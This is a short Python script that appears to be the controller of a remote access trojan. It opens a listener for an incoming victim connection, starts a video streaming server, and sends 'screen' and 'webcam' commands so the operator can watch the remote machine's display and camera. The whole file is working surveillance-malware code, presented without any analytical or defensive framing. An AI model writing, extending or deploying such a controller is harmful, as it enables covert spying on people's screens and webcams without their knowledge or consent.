from vidstream import *
import socket
import os

local_ip_address = "192.168.0.237"
socket_port = 8181

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP connection
s.bind((local_ip_address, socket_port))
s.listen(5)

client, addr = s.accept()
network_name = client.recv(1024).decode("utf-8") # Recive 1024 bytes of data
print(f"[+] {addr[0]} ({addr[1]} | {network_name})")

server = StreamingServer(local_ip_address, 9999)
server.start_server()
print("[~] Server was successfully started")

while True:
    cmd = input(f"{addr[0]}@{network_name}~#")
    if cmd == "screen":
        client.send(cmd.encode("utf-8"))
    elif cmd == "webcam":
        client.send(cmd.encode("utf-8"))
    elif cmd == "clear":
        os.system("cls")

